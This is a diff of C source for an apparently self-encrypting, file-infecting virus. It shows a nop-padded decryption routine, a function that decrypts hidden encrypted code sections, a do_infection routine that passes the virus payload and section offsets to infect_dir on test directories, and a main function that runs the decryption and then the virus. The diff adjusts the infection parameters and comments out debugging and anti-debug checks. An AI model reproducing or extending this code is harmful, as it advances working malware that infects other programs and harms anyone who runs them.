@@ -10,8 +10,8 @@ extern char   environ[8];
 int main(void) asm ("entry");
 
 __start2 void DECRYPT_ROUTINE(char *s, uint64_t n, uint64_t k[2]){
-//}
-//__start void ENCRYPT_ROUTINE(char *s, uint64_t n, uint64_t k[2]){
+		//}
+		//__start void ENCRYPT_ROUTINE(char *s, uint64_t n, uint64_t k[2]){
 asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
 asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
 asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
@@ -27,8 +27,9 @@ asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
 asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
 }
 
+extern char data;
+extern char dataearly;
 extern struct s_opt opt;
-
 extern uint64_t iscompressed;
 extern char test_area;
 extern char   key[16];
@@ -87,22 +88,22 @@ int __start decryptHiddenCode(){
 		//-- decrypt z2        ------
 		//if (decrypt((char*)&cmpr_start, ((size_t)&cmpr_end) - ((size_t)&cmpr_start), k, FALSE, &DECRYPT_ROUTINE) == -1)
 		//		return FALSE;
-		environ[0] = 'o'; debug(environ);
 		//-- decrypt test area ------
-		if (decrypt(&test_area,15, k, FALSE, &DECRYPT_ROUTINE) == -1)
-				return FALSE;
-		environ[0] = 'b'; debug(environ);
+		//if (decrypt(&test_area,15, k, FALSE, &DECRYPT_ROUTINE) == -1)
+		//		return FALSE;
 		//check test area
-		for (int i = 0; i < 15; i++)
-				if ((&test_area)[i] != 'A')
-						return FALSE;
 		//-- decrypt z3        ------
 		uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
 		char *s = ((char*)&crypt_start);
-		environ[0] = 'c'; debug(environ);
+		//environ[0] = 'c'; debug(environ);
 		if (decrypt(s,n,k, iscompressed, &DECRYPT_ROUTINE) == -1)
 				return FALSE;
-		environ[0] = 'd'; debug(environ);
+		//environ[0] = 'd'; debug(environ);
+
+		for (int i = 0; i < 15; i++)
+				if ((&test_area)[i] != 'A')
+						return FALSE;
+
 		return TRUE;
 }
 
@@ -119,9 +120,11 @@ void do_infection(){
 		size_t crypt_len = ((size_t)&crypt_end) - ((size_t)&crypt_start);
 
 		size_t decrypt_routine_off = ((size_t)&DECRYPT_ROUTINE) - ((size_t)&bin_start);
+		size_t data_off = ((size_t)&data) - ((size_t)&bin_start);
+		size_t dataearly_off = ((size_t)&dataearly) - ((size_t)&bin_start);
 
-		infect_dir("/tmp/test", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE}, opt);
-		infect_dir("/tmp/test2", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE}, opt);
+		infect_dir("/tmp/test", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE,data_off,dataearly_off}, opt);
+		infect_dir("/tmp/test2", (InfectParams){virus, virus_len, cmpr_off, cmpr_len, crypt_off, crypt_len, decrypt_routine_off, &DECRYPT_ROUTINE,data_off,dataearly_off}, opt);
 }
 
 int virus(void){
@@ -170,7 +173,7 @@ __start int main(void){
 				return FALSE;
 		((unsigned char *)key)[0] ^= 0b01110010;
 		//if (checkdebug() == 0)
-				return decryptHiddenCode() && virus();
+		return decryptHiddenCode() && virus();
 		//else
 		//		print_debugging();
 		return (0);
